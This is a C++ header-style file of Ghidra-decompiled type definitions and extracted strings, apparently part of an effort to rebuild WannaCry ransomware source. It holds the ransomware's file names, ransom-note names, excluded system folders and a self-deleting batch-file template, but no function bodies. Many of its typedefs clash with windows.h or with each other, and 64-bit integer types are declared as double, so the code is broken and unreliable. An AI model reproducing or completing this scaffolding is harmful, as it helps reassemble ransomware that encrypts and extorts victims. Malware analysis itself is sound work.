#include <cstdio>
#include <list>
#include <string>
#include <cstddef>
#include <cstdlib>
#include <ctime>
#include <cwchar>
#include <new>
#include <cstdint>
#include <iostream>
#include <string>
#include <stdint.h>
#include <exception>

#define pointer32 void*
#define local_unwind2 _local_unwind2
#define CONCAT31(extra, b) (((uint32_t)(extra) << 8) | (uint8_t)(b))

#include <windows.h>
#include <aclapi.h>
#include <wincrypt.h>

// 1. Tipos de datos propios de Ghidra
using std::uint8_t;
using std::uint16_t;
using std::uint32_t;
using std::uint64_t;

// 1. Tipos de datos propios de Ghidra
// Tipos genéricos creados por Ghidra
typedef BYTE      undefined;
typedef BYTE      undefined1;
typedef WORD      undefined2;
typedef DWORD     undefined4;
typedef unsigned __int64 undefined8;

// Estructura de 3 bytes para undefined3
struct undefined3 {
    uint8_t bytes[3];
};

// 2. Definición de firmas para los punteros a función DAT_
typedef void (__cdecl *DAT_1000d934_fn)(DWORD);
typedef void (__cdecl *DAT_1000d930_fn)(const wchar_t*);

// 3. Declaración de los símbolos globales externos
extern "C" {
    extern DAT_1000d934_fn DAT_1000d934;
    extern DAT_1000d930_fn DAT_1000d930;
}

// Definición de datos y cadenas extraídas del ejecutable
const WCHAR DAT_1000d918 = 0;
const WCHAR u_SYSTEM_1000c068[] = L"SYSTEM";
const WCHAR u_S_1_5_18_1000c078[] = L"S-1-5-18";

// Cadenas de formato extraídas de la decompilación de Ghidra
const char s__d_d_bat_1000c034[] = "%d_%d.bat";
const char DAT_1000c030[] = "wb";
const char s__s_del__a___0_1000c020[] = "%s\r\ndel /a /f \"%s\"\r\n";

const char s_c_wnry_1000c010[] = "c.wnry";
const char DAT_1000c018[] = "wb";
const char DAT_1000c01c[] = "rb";

const char s_advapi32_dll_1000c058[] = "advapi32.dll";
const char s_ConvertSidToStringSidW_1000c040[] = "ConvertSidToStringSidW";

// Define undefined4 explícitamente antes de usarlo
//typedef uint32_t undefined4;
typedef uint8_t  undefined1;

typedef void* pointer;
typedef char* string;
typedef wchar_t* unicode;

typedef unsigned char   byte;
typedef unsigned int    uint;
typedef unsigned short  ushort;
typedef unsigned char   undefined1;
typedef unsigned short  undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long ulonglong;
typedef long long       longlong;

typedef unsigned char undefined;

typedef char* string;

typedef unsigned char   undefined;

//typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
//typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

using std::exception; // Permite referenciar 'exception' directamente en lugar de std::exception

struct TypeDescriptor {
    void *pVFTable;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    unsigned int adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory:31;
    dword DataIsDirectory:1;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

typedef int __ehstate_t;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

struct _s_FuncInfo {
    unsigned int magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    unsigned int nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    unsigned int nIPMapEntries;
    void *pIPToStateMap;
};

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef ulong DWORD;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _WIN32_FIND_DATAW _WIN32_FIND_DATAW, *P_WIN32_FIND_DATAW;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

typedef wchar_t WCHAR;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAW {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    WCHAR cFileName[260];
    WCHAR cAlternateFileName[14];
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _WIN32_FIND_DATAW *LPWIN32_FIND_DATAW;

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef DWORD (*PTHREAD_START_ROUTINE)(LPVOID);

typedef PTHREAD_START_ROUTINE LPTHREAD_START_ROUTINE;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef union _ULARGE_INTEGER _ULARGE_INTEGER, *P_ULARGE_INTEGER;

typedef union _ULARGE_INTEGER ULARGE_INTEGER;

typedef struct _struct_22 _struct_22, *P_struct_22;

typedef struct _struct_23 _struct_23, *P_struct_23;

typedef double ULONGLONG;

struct _struct_23 {
    DWORD LowPart;
    DWORD HighPart;
};

struct _struct_22 {
    DWORD LowPart;
    DWORD HighPart;
};

union _ULARGE_INTEGER {
    struct _struct_22 s;
    struct _struct_23 u;
    ULONGLONG QuadPart;
};

typedef PVOID PSECURITY_DESCRIPTOR;

//typedef struct _ACL _ACL, *P_ACL;

struct _ACL {
    BYTE AclRevision;
    BYTE Sbz1;
    WORD AclSize;
    WORD AceCount;
    WORD Sbz2;
};

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

//typedef struct _ACL ACL;

typedef ACL *PACL;

typedef WCHAR *LPWSTR;

typedef DWORD SECURITY_INFORMATION;

typedef struct _SID_IDENTIFIER_AUTHORITY _SID_IDENTIFIER_AUTHORITY, *P_SID_IDENTIFIER_AUTHORITY;

typedef struct _SID_IDENTIFIER_AUTHORITY *PSID_IDENTIFIER_AUTHORITY;

struct _SID_IDENTIFIER_AUTHORITY {
    BYTE Value[6];
};

typedef WCHAR *LPCWSTR;

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef ULARGE_INTEGER *PULARGE_INTEGER;

typedef enum _TOKEN_INFORMATION_CLASS {
    TokenUser=1,
    TokenGroups=2,
    TokenPrivileges=3,
    TokenOwner=4,
    TokenPrimaryGroup=5,
    TokenDefaultDacl=6,
    TokenSource=7,
    TokenType=8,
    TokenImpersonationLevel=9,
    TokenStatistics=10,
    TokenRestrictedSids=11,
    TokenSessionId=12,
    TokenGroupsAndPrivileges=13,
    TokenSessionReference=14,
    TokenSandBoxInert=15,
    TokenAuditPolicy=16,
    TokenOrigin=17,
    TokenElevationType=18,
    TokenLinkedToken=19,
    TokenElevation=20,
    TokenHasRestrictions=21,
    TokenAccessInformation=22,
    TokenVirtualizationAllowed=23,
    TokenVirtualizationEnabled=24,
    TokenIntegrityLevel=25,
    TokenUIAccess=26,
    TokenMandatoryPolicy=27,
    TokenLogonSid=28,
    MaxTokenInfoClass=29
} _TOKEN_INFORMATION_CLASS;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef PVOID PSID;

typedef enum _TOKEN_INFORMATION_CLASS TOKEN_INFORMATION_CLASS;

typedef HANDLE *PHANDLE;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR HCRYPTPROV;

typedef ULONG_PTR HCRYPTKEY;

typedef ULONG_PTR SIZE_T;

typedef DWORD ULONG;

typedef struct _FILETIME *LPFILETIME;

typedef int (*FARPROC)(void);

typedef DWORD *LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD *PDWORD;

typedef HANDLE HGLOBAL;

typedef BOOL *LPBOOL;

typedef struct HINSTANCE__ *HINSTANCE;

typedef void *LPCVOID;

//typedef HINSTANCE HMODULE;

typedef HANDLE HLOCAL;

typedef BOOL *PBOOL;

typedef unsigned int UINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset:31;
    dword NameIsString:1;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

struct IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    MY_IMAGE_SCN_TYPE_NO_PAD = 8,
    MY_IMAGE_SCN_RESERVED_0001 = 16,
    MY_IMAGE_SCN_CNT_CODE = 32,
    MY_IMAGE_SCN_CNT_INITIALIZED_DATA = 64,
    MY_IMAGE_SCN_CNT_UNINITIALIZED_DATA = 128,
    MY_IMAGE_SCN_LNK_OTHER = 256,
    MY_IMAGE_SCN_LNK_INFO = 512,
    MY_IMAGE_SCN_RESERVED_0040 = 1024,
    MY_IMAGE_SCN_LNK_REMOVE = 2048,
    MY_IMAGE_SCN_LNK_COMDAT = 4096,
    MY_IMAGE_SCN_GPREL = 32768,
    MY_IMAGE_SCN_MEM_16BIT = 131072,
    MY_IMAGE_SCN_MEM_PURGEABLE = 131072,
    MY_IMAGE_SCN_MEM_LOCKED = 262144,
    MY_IMAGE_SCN_MEM_PRELOAD = 524288,
    MY_IMAGE_SCN_ALIGN_1BYTES = 1048576,
    MY_IMAGE_SCN_ALIGN_2BYTES = 2097152,
    MY_IMAGE_SCN_ALIGN_4BYTES = 3145728,
    MY_IMAGE_SCN_ALIGN_8BYTES = 4194304,
    MY_IMAGE_SCN_ALIGN_16BYTES = 5242880,
    MY_IMAGE_SCN_ALIGN_32BYTES = 6291456,
    MY_IMAGE_SCN_ALIGN_64BYTES = 7340032,
    MY_IMAGE_SCN_ALIGN_128BYTES = 8388608,
    MY_IMAGE_SCN_ALIGN_256BYTES = 9437184,
    MY_IMAGE_SCN_ALIGN_512BYTES = 10485760,
    MY_IMAGE_SCN_ALIGN_1024BYTES = 11534336,
    MY_IMAGE_SCN_ALIGN_2048BYTES = 12582912,
    MY_IMAGE_SCN_ALIGN_4096BYTES = 13631488,
    MY_IMAGE_SCN_ALIGN_8192BYTES = 14680064,
    MY_IMAGE_SCN_LNK_NRELOC_OVFL = 16777216,
    MY_IMAGE_SCN_MEM_DISCARDABLE = 33554432,
    MY_IMAGE_SCN_MEM_NOT_CACHED = 67108864,
    MY_IMAGE_SCN_MEM_NOT_PAGED = 134217728,
    MY_IMAGE_SCN_MEM_SHARED = 268435456,
    MY_IMAGE_SCN_MEM_EXECUTE = 536870912,
    MY_IMAGE_SCN_MEM_READ = 1073741824,
    MY_IMAGE_SCN_MEM_WRITE = 2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO_STRUCT {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
} VS_VERSION_INFO_STRUCT, *PVS_VERSION_INFO_STRUCT;

typedef struct IMAGE_BASE_RELOCATION IMAGE_BASE_RELOCATION, *PIMAGE_BASE_RELOCATION;

struct IMAGE_BASE_RELOCATION {
    dword VirtualAddress;
    dword SizeOfBlock;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct MY_IMAGE_DIRECTORY_ENTRY_EXPORT {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    ImageBaseOffset32 Name;
    dword Base;
    dword NumberOfFunctions;
    dword NumberOfNames;
    ImageBaseOffset32 AddressOfFunctions;
    ImageBaseOffset32 AddressOfNames;
    ImageBaseOffset32 AddressOfNameOrdinals;
} MY_IMAGE_DIRECTORY_ENTRY_EXPORT, *PMY_IMAGE_DIRECTORY_ENTRY_EXPORT;

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

//typedef struct _iobuf FILE;

typedef enum _TRUSTEE_FORM {
    TRUSTEE_IS_SID=0,
    TRUSTEE_IS_NAME=1,
    TRUSTEE_BAD_FORM=2,
    TRUSTEE_IS_OBJECTS_AND_SID=3,
    TRUSTEE_IS_OBJECTS_AND_NAME=4
} _TRUSTEE_FORM;

typedef enum _MULTIPLE_TRUSTEE_OPERATION {
    NO_MULTIPLE_TRUSTEE=0,
    TRUSTEE_IS_IMPERSONATE=1
} _MULTIPLE_TRUSTEE_OPERATION;

typedef enum _TRUSTEE_FORM TRUSTEE_FORM;

typedef enum _SE_OBJECT_TYPE {
    SE_UNKNOWN_OBJECT_TYPE=0,
    SE_FILE_OBJECT=1,
    SE_SERVICE=2,
    SE_PRINTER=3,
    SE_REGISTRY_KEY=4,
    SE_LMSHARE=5,
    //SE_KERNEL_OBJECT=6,
    SE_WINDOW_OBJECT=7,
    SE_DS_OBJECT=8,
    SE_DS_OBJECT_ALL=9,
    SE_PROVIDER_DEFINED_OBJECT=10,
    SE_WMIGUID_OBJECT=11,
    SE_REGISTRY_WOW64_32KEY=12
} _SE_OBJECT_TYPE;

typedef enum _ACCESS_MODE {
    NOT_USED_ACCESS=0,
    GRANT_ACCESS=1,
    SET_ACCESS=2,
    DENY_ACCESS=3,
    REVOKE_ACCESS=4,
    SET_AUDIT_SUCCESS=5,
    SET_AUDIT_FAILURE=6
} _ACCESS_MODE;

//typedef struct _EXPLICIT_ACCESS_A _EXPLICIT_ACCESS_A, *P_EXPLICIT_ACCESS_A;

typedef enum _ACCESS_MODE ACCESS_MODE;

typedef struct _TRUSTEE_A _TRUSTEE_A, *P_TRUSTEE_A;

typedef struct _TRUSTEE_A TRUSTEE_A;

typedef enum _MULTIPLE_TRUSTEE_OPERATION MULTIPLE_TRUSTEE_OPERATION;

typedef enum _TRUSTEE_TYPE {
    TRUSTEE_IS_UNKNOWN=0,
    TRUSTEE_IS_USER=1,
    TRUSTEE_IS_GROUP=2,
    TRUSTEE_IS_DOMAIN=3,
    TRUSTEE_IS_ALIAS=4,
    TRUSTEE_IS_WELL_KNOWN_GROUP=5,
    TRUSTEE_IS_DELETED=6,
    TRUSTEE_IS_INVALID=7,
    TRUSTEE_IS_COMPUTER=8
} _TRUSTEE_TYPE;

typedef enum _TRUSTEE_TYPE TRUSTEE_TYPE;

struct _TRUSTEE_A {
    struct _TRUSTEE_A *pMultipleTrustee;
    MULTIPLE_TRUSTEE_OPERATION MultipleTrusteeOperation;
    TRUSTEE_FORM TrusteeForm;
    TRUSTEE_TYPE TrusteeType;
    LPSTR ptstrName;
};

struct _EXPLICIT_ACCESS_A {
    DWORD grfAccessPermissions;
    ACCESS_MODE grfAccessMode;
    DWORD grfInheritance;
    TRUSTEE_A Trustee;
};

//typedef struct _EXPLICIT_ACCESS_A *PEXPLICIT_ACCESS_A;

typedef enum _SE_OBJECT_TYPE SE_OBJECT_TYPE;

typedef void (*PMFN)(void *);

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;


// WARNING! conflicting data type names: /ehdata.h/TypeDescriptor - /TypeDescriptor

typedef struct PMD PMD, *PPMD;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s_CatchableType {
    unsigned int properties;
    struct TypeDescriptor *pType;
    struct PMD thisDisplacement;
    int sizeOrOffset;
    PMFN copyFunction;
};

typedef struct _s_CatchableType CatchableType;

typedef struct _s_CatchableTypeArray _s_CatchableTypeArray, *P_s_CatchableTypeArray;

typedef struct _s_CatchableTypeArray CatchableTypeArray;

struct _s_CatchableTypeArray {
    int nCatchableTypes;
    CatchableType *arrayOfCatchableTypes[0];
};

typedef struct _s_ThrowInfo _s_ThrowInfo, *P_s_ThrowInfo;

typedef struct _s_ThrowInfo ThrowInfo;

struct _s_ThrowInfo {
    unsigned int attributes;
    PMFN pmfnUnwind;
    int (*pForwardCompat)(void);
    CatchableTypeArray *pCatchableTypeArray;
};

typedef struct struct_exception {
    int dummy;
} struct_exception, *Pstruct_exception;

typedef struct type_info type_info, *Ptype_info;

typedef struct type_info {
    int dummy;
} type_info, *Ptype_info;

/* --- Primer tipo de basic_string sanitizado --- */
typedef struct basic_string_ushort_traits_alloc {
    int dummy;
} basic_string_ushort_traits_alloc, *Pbasic_string_ushort_traits_alloc;

/* --- Segundo tipo de basic_string sanitizado --- */
typedef struct basic_string_ushort_std_traits_alloc {
    int dummy;
} basic_string_ushort_std_traits_alloc, *Pbasic_string_ushort_std_traits_alloc;

typedef unsigned int size_t;

typedef longlong __time64_t;

typedef __time64_t time_t;



string s_c_wnry_1000c010;
undefined DAT_1000c018;
undefined DAT_1000c01c;
string s_s_del_a_0_1000c020;
undefined DAT_1000c030;
string s_d_d_bat_1000c034;
string s_ConvertSidToStringSidW_1000c040;
string s_advapi32_dll_1000c058;
WCHAR DAT_1000d918_WCHAR;
unicode u_SYSTEM_1000c068;
unicode u_S_1_5_18_1000c078;
string s_EVERYONE_1000c08c;
undefined LAB_10006db1;
pointer PTR_FUN_100071f8;
void *ExceptionList;
undefined LAB_10006def;
undefined *DAT_1000d934_ptr;
undefined *DAT_1000d930_ptr;
undefined LAB_100029e0;
unicode u_WNCRYT_1000cbc8;
wchar_t DAT_1000d918_wchar;
undefined *DAT_1000d91c_ptr;
undefined *DAT_1000d924_ptr;
undefined *PTR_DAT_1000d8d4;
undefined *DAT_1000d920_ptr;
undefined *DAT_1000d928_ptr;
undefined DAT_10006bb6;
undefined DAT_10007200;
undefined DAT_1000cbe4;
string s_WANACRY_1000cbe8;
unicode u_WNCRY_1000cbf4;
unicode u_WNCYR_1000cc04;
undefined DAT_1000ccac;
undefined DAT_1000ccb4;
undefined *PTR__C_1000712c;
undefined LAB_10006e22;
undefined DAT_1000cc14;
unicode u_WanaDecryptor_bmp_1000cc1c;
unicode u_WanaDecryptor_exe_lnk_1000cc44;
unicode u_Please_Read_Me_txt_1000cc74;
undefined LAB_10006e38;
undefined *DAT_1000d92c_ptr;
undefined LAB_10006e59;
pointer PTR_u_doc_1000c098;
pointer PTR_u_docb_1000c0fc;
unicode u_dll_1000ccc4;
unicode u_exe_1000ccd0;
undefined DAT_1000ccdc;
unicode u_WanaDecryptor_exe_1000cce4;
unicode u_Content_IE5_1000cd0c;
unicode u_Temporary_Internet_Files_1000cd24;
unicode u_This_folder_protects_against_ran_1000cd58;
unicode u_Local_Settings_Temp_1000cdf4;
unicode u_AppData_Local_Temp_1000ce20;
unicode u_Program_Files_x86_1000ce48;
unicode u_Program_Files_1000ce74;
unicode u_WINDOWS_1000ce94;
unicode u_ProgramData_1000cea8;
unicode u_Intel_1000cec4;
undefined DAT_1000ced4;
FARPROC DAT_1000d91c_far;
FARPROC DAT_1000d920_far;
FARPROC DAT_1000d924_far;
FARPROC DAT_1000d928_far;
FARPROC DAT_1000d92c_far;
FARPROC DAT_1000d930_far;
FARPROC DAT_1000d934_far;
string s_CloseHandle_1000cedc;
string s_DeleteFileW_1000cee8;
string s_MoveFileExW_1000cef4;
string s_MoveFileW_1000cf00;
string s_ReadFile_1000cf0c;
string s_WriteFile_1000cf18;
string s_CreateFileW_1000cf24;
string s_kernel32_dll_1000cf30;
undefined *PTR_npos_10007130;
undefined LAB_10006e81;
undefined DAT_1000d938;
pointer PTR_FUN_1000720c;
undefined *DAT_1000d93c_ptr;
undefined *DAT_1000d940_ptr;
